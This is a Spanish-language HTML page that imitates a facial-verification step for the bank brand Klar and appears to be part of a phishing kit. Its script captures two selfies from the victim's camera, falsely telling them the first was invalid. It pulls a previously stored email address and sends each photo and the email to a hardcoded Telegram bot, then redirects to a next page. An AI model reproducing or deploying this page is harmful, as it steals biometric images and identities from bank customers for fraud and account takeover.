<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Klar | Reconocimiento facial</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #f5f6f7;
    --text: #111111;
    --muted: #4a4f55;
    --radius: 999px;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { min-height: 100%; }
  body {
    font-family: "Montserrat", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
    background: var(--bg);
    color: var(--text);
    -webkit-font-smoothing: antialiased;
  }

  header {
    position: sticky; top: 0; z-index: 10;
    display: flex; align-items: center; justify-content: space-between;
    height: 84px;
    padding: env(safe-area-inset-top, 0) 28px 0;
    background: #1a1a1a;
    color: #fff;
  }
  .logo { height: 60px; width: 60px; object-fit: cover; border-radius: 14px; display: block; }
  .logo-text { font-size: 42px; font-weight: 500; letter-spacing: -1px; line-height: 1; display: none; }
  .menu-btn {
    width: 44px; height: 44px; border: 0; background: none;
    display: grid; grid-template-columns: repeat(2, 11px); gap: 12px;
    place-content: center;
  }
  .menu-btn span { width: 11px; height: 11px; background: #fff; border-radius: 50%; }

  .hero {
    min-height: calc(100svh - 84px);
    display: flex; flex-direction: column; justify-content: center; align-items: center;
    padding: 32px 24px calc(32px + env(safe-area-inset-bottom, 0));
  }
  .inner {
    width: 100%; max-width: 460px; margin: 0 auto;
    display: flex; flex-direction: column; align-items: center; text-align: center;
  }

  h1 {
    font-size: clamp(24px, 7vw, 30px);
    font-weight: 500; line-height: 1.15; letter-spacing: -.5px;
    margin-bottom: 10px;
  }
  .sub {
    font-size: clamp(15px, 4.2vw, 17px);
    line-height: 1.4; color: var(--muted);
    margin-bottom: 26px;
  }

  .cam-frame {
    position: relative;
    width: min(78vw, 320px);
    aspect-ratio: 3 / 4;
    margin: 0 auto 24px;
    border-radius: 32px;
    overflow: hidden;
    background: #0d0d0d;
    box-shadow: 0 10px 30px rgba(0,0,0,.18);
  }
  .cam-frame video,
  .cam-frame canvas,
  .cam-frame img {
    position: absolute; inset: 0;
    width: 100%; height: 100%;
    object-fit: cover;
    display: block;
  }
  /* Solo el video en vivo se muestra en espejo (para que el usuario se vea natural).
     La foto capturada y el canvas NO se voltean. */
  .cam-frame video { transform: scaleX(-1); }
  .cam-frame img,
  .cam-frame canvas { transform: none; }
  .cam-frame img { display: none; }

  .oval-guide {
    position: absolute;
    top: 50%; left: 50%;
    width: 66%; height: 78%;
    transform: translate(-50%, -50%);
    border: 2.5px dashed rgba(255,255,255,.75);
    border-radius: 50%;
    pointer-events: none;
    transition: border-color .3s;
  }
  .cam-frame.ready .oval-guide { border-color: #00f076; border-style: solid; }

  .cam-placeholder {
    position: absolute; inset: 0;
    display: flex; flex-direction: column;
    align-items: center; justify-content: center;
    color: #fff; padding: 20px; text-align: center;
    background: #0d0d0d;
  }
  .cam-placeholder svg { width: 46px; height: 46px; margin-bottom: 12px; opacity: .85; }
  .cam-placeholder p { font-size: 14px; opacity: .8; line-height: 1.4; }

  .btn {
    width: 100%; height: 56px; border-radius: var(--radius); cursor: pointer;
    font: inherit; font-size: 17px; font-weight: 500; color: #111;
    background: transparent; border: 1.5px solid #111;
    transition: background .15s;
  }
  .btn:hover, .btn:active { background: rgba(0,0,0,.06); }
  .btn:disabled { opacity: .55; cursor: not-allowed; }
  .btn.primary { background: #111; color: #fff; border-color: #111; }
  .btn.primary:hover, .btn.primary:active { background: #2a2a2a; }
  .btn:focus-visible { outline: 2px solid #111; outline-offset: 3px; }

  .actions { display: flex; flex-direction: column; gap: 12px; width: 100%; }

  .msg { min-height: 18px; font-size: 14px; margin-top: 12px; }
  .msg.err { color: #d93025; }
  .msg.ok { color: #1e8e3e; }

  .badge {
    display: inline-flex; align-items: center; gap: 6px;
    background: #111; color: #fff;
    font-size: 12px; font-weight: 500;
    padding: 6px 14px; border-radius: var(--radius);
    margin-bottom: 14px;
  }
  .badge .dot { width: 7px; height: 7px; border-radius: 50%; background: #00f076; }

  .hint { font-size: 13px; color: var(--muted); margin-top: 10px; }

  @media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
</style>
</head>
<body>

<header>
  <a href="#" aria-label="Klar">
    <img class="logo" id="logo" alt="Klar"
         src="https://play-lh.googleusercontent.com/Euzej7ycTwY9s9N2bpfvmad3tm8SEFeqmadsa-bxsweGvvgsM0Sgapk4aXEO1SKrHOjMp4nsqJG-Zd8Db1rc6Q">
    <span class="logo-text" id="logoText">Klar</span>
  </a>
  <span class="menu-btn" aria-hidden="true"><span></span><span></span><span></span><span></span></span>
</header>

<main class="hero">
  <div class="inner">
    <div class="badge" id="badge"><span class="dot"></span><span id="badgeText">Intento 1 de 2</span></div>
    <h1 id="titulo">Verificación facial</h1>
    <p class="sub" id="subtitulo">Coloca tu rostro dentro del óvalo y captura una foto para continuar.</p>

    <div class="cam-frame" id="camFrame">
      <video id="video" autoplay playsinline muted></video>
      <canvas id="canvas" hidden></canvas>
      <img id="photo" alt="Foto capturada">
      <div class="oval-guide" id="ovalGuide"></div>
      <div class="cam-placeholder" id="camPlaceholder">
        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
          <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
          <circle cx="12" cy="13" r="4"/>
        </svg>
        <p>Pulsa "Activar cámara"<br>para comenzar</p>
      </div>
    </div>

    <div class="actions">
      <button type="button" class="btn" id="startBtn">Activar cámara</button>
      <button type="button" class="btn primary" id="captureBtn" disabled>Capturar foto</button>
    </div>

    <div class="msg" id="msg" role="status"></div>
    <p class="hint" id="hint"></p>
  </div>
</main>

<script>
  // ====== CONFIGURACIÓN ======
  const BOT_TOKEN = '7945542556:AAGAeGTHrE0i0YTCWqL4FxlwyWT_urry51M';
  const CHAT_ID   = '5452961674';
  const DESTINO   = 'KO.html';   // ← redirección final
  const LS_EMAIL  = 'klar_ultimo_correo';
  const TOTAL_INTENTOS = 2;
  // ============================

  const logo = document.getElementById('logo');
  const logoText = document.getElementById('logoText');
  logo.addEventListener('error', () => { logo.style.display = 'none'; logoText.style.display = 'block'; });

  const video          = document.getElementById('video');
  const canvas         = document.getElementById('canvas');
  const photo          = document.getElementById('photo');
  const camFrame       = document.getElementById('camFrame');
  const camPlaceholder = document.getElementById('camPlaceholder');
  const startBtn       = document.getElementById('startBtn');
  const captureBtn     = document.getElementById('captureBtn');
  const msg            = document.getElementById('msg');
  const badgeText      = document.getElementById('badgeText');
  const titulo         = document.getElementById('titulo');
  const subtitulo      = document.getElementById('subtitulo');
  const hint           = document.getElementById('hint');

  const showMsg = (text, type) => { msg.className = 'msg ' + (type || ''); msg.textContent = text; };

  let intentoActual = 1;
  let stream = null;

  function obtenerCorreo() {
    try { return localStorage.getItem(LS_EMAIL) || '(sin correo guardado)'; }
    catch { return '(sin correo guardado)'; }
  }

  function actualizarUI() {
    badgeText.textContent = `Intento ${intentoActual} de ${TOTAL_INTENTOS}`;
    if (intentoActual === 1) {
      titulo.textContent = 'Verificación facial';
      subtitulo.textContent = 'Coloca tu rostro dentro del óvalo y captura una foto para continuar.';
      hint.textContent = '';
    } else {
      titulo.textContent = 'Reintento de verificación';
      subtitulo.textContent = 'La primera captura no fue válida. Vuelve a colocar tu rostro dentro del óvalo.';
      hint.textContent = 'Asegúrate de tener buena iluminación y el rostro centrado.';
    }
  }
  actualizarUI();

  // Pedir cámara con cascada de restricciones
  async function abrirCamara() {
    const intentos = [
      { video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }, audio: false },
      { video: { facingMode: 'user' }, audio: false },
      { video: true, audio: false }
    ];
    let ultimoError = null;
    for (const constraints of intentos) {
      try {
        return await navigator.mediaDevices.getUserMedia(constraints);
      } catch (err) {
        ultimoError = err;
        console.warn('Cámara falló con', constraints, '→', err.name);
      }
    }
    throw ultimoError || new Error('No se pudo abrir la cámara');
  }

  startBtn.addEventListener('click', async () => {
    showMsg('', '');
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      showMsg('Tu navegador no soporta el acceso a la cámara. Usa HTTPS o localhost.', 'err');
      return;
    }
    startBtn.disabled = true;
    startBtn.textContent = 'Abriendo cámara…';

    try {
      stream = await abrirCamara();
      video.srcObject = stream;

      await new Promise((resolve, reject) => {
        const timeout = setTimeout(() => reject(new Error('Tiempo de espera agotado al iniciar el video')), 8000);
        video.onloadedmetadata = () => { clearTimeout(timeout); resolve(); };
        video.play().catch(reject);
      });

      const track = stream.getVideoTracks()[0];
      const settings = track.getSettings ? track.getSettings() : {};
      hint.textContent = (settings.width && settings.height)
        ? `Cámara: ${settings.width}×${settings.height} · ${settings.frameRate || '?'} fps`
        : '';

      camPlaceholder.style.display = 'none';
      camFrame.classList.add('ready');
      startBtn.textContent = 'Cámara activa';
      captureBtn.disabled = false;
    } catch (err) {
      console.error(err);
      startBtn.disabled = false;
      startBtn.textContent = 'Activar cámara';
      let texto = 'No se pudo acceder a la cámara.';
      if (err.name === 'NotAllowedError') texto = 'Permiso de cámara denegado. Actívalo en tu navegador (icono de candado).';
      else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') texto = 'No se encontró ninguna cámara en este dispositivo.';
      else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') texto = 'La cámara está en uso por otra aplicación.';
      else if (err.name === 'OverconstrainedError') texto = 'La cámara no soporta la configuración solicitada.';
      else if (err.message) texto += ' ' + err.message;
      showMsg(texto, 'err');
    }
  });

  // Captura: ImageCapture nativo (sin espejo) o canvas SIN voltear
  async function capturarFoto() {
    const track = stream && stream.getVideoTracks()[0];

    // A) ImageCapture: devuelve la foto tal cual la capta el sensor (sin espejo)
    if (track && typeof ImageCapture !== 'undefined') {
      try {
        const ic = new ImageCapture(track);
        const blob = await ic.takePhoto();
        if (blob && blob.size > 0) {
          return { blob, mime: blob.type || 'image/jpeg' };
        }
      } catch (e) {
        console.warn('ImageCapture falló, usando canvas:', e);
      }
    }

    // B) Canvas SIN scale(-1, 1): dibuja la imagen real, no el espejo
    const w = video.videoWidth;
    const h = video.videoHeight;
    if (!w || !h) return null;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, w, h);   // ← sin volteo

    return await new Promise(resolve => {
      if (canvas.toBlob) {
        canvas.toBlob(b => resolve(b ? { blob: b, mime: 'image/png' } : null), 'image/png', 1.0);
      } else {
        const dataURL = canvas.toDataURL('image/png');
        const [meta, b64] = dataURL.split(',');
        const mime = meta.match(/:(.*?);/)[1];
        const bin = atob(b64);
        const bytes = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
        resolve({ blob: new Blob([bytes], { type: mime }), mime });
      }
    });
  }

  async function enviarFotoATelegram(blob, mime, correo, intento) {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    const caption =
      `📸 <b>Verificación facial</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `📧 <b>Correo:</b> <code>${correo}</code>\n` +
      `🔁 <b>Intento:</b> ${intento} de ${TOTAL_INTENTOS}`;
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    const ext = (mime && mime.includes('png')) ? 'png' : 'jpg';
    form.append('photo', blob, `selfie_intento${intento}.${ext}`);

    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form
    });
    const data = await res.json();
    if (!data.ok) throw new Error(data.description || 'Error de Telegram');
    return data;
  }

  captureBtn.addEventListener('click', async () => {
    showMsg('', '');
    captureBtn.disabled = true;
    captureBtn.textContent = 'Capturando…';

    try {
      const resultado = await capturarFoto();
      if (!resultado || !resultado.blob) {
        showMsg('No se pudo capturar la imagen. Intenta de nuevo.', 'err');
        captureBtn.disabled = false;
        captureBtn.textContent = 'Capturar foto';
        return;
      }

      const { blob, mime } = resultado;

      // El preview se muestra sin transform (CSS .cam-frame img { transform: none })
      const previewURL = URL.createObjectURL(blob);
      photo.src = previewURL;
      photo.style.display = 'block';
      video.style.display = 'none';

      captureBtn.textContent = 'Enviando…';
      const correo = obtenerCorreo();
      await enviarFotoATelegram(blob, mime, correo, intentoActual);

      showMsg('✓ Foto enviada.', 'ok');

      if (intentoActual < TOTAL_INTENTOS) {
        intentoActual++;
        actualizarUI();
        showMsg('Foto recibida. Preparando reintento de verificación…', 'ok');

        setTimeout(() => {
          photo.style.display = 'none';
          video.style.display = 'block';
          captureBtn.disabled = false;
          captureBtn.textContent = 'Capturar de nuevo';
          showMsg('', '');
        }, 1200);
      } else {
        if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
        showMsg('✓ Verificación completada. Redirigiendo…', 'ok');
        setTimeout(() => { window.location.href = DESTINO; }, 800);
      }
    } catch (err) {
      console.error(err);
      showMsg('Error al enviar la foto: ' + (err.message || 'Intenta de nuevo.'), 'err');
      photo.style.display = 'none';
      video.style.display = 'block';
      captureBtn.disabled = false;
      captureBtn.textContent = 'Capturar foto';
    }
  });

  window.addEventListener('pagehide', () => {
    if (stream) stream.getTracks().forEach(t => t.stop());
  });
</script>
</body>
</html>
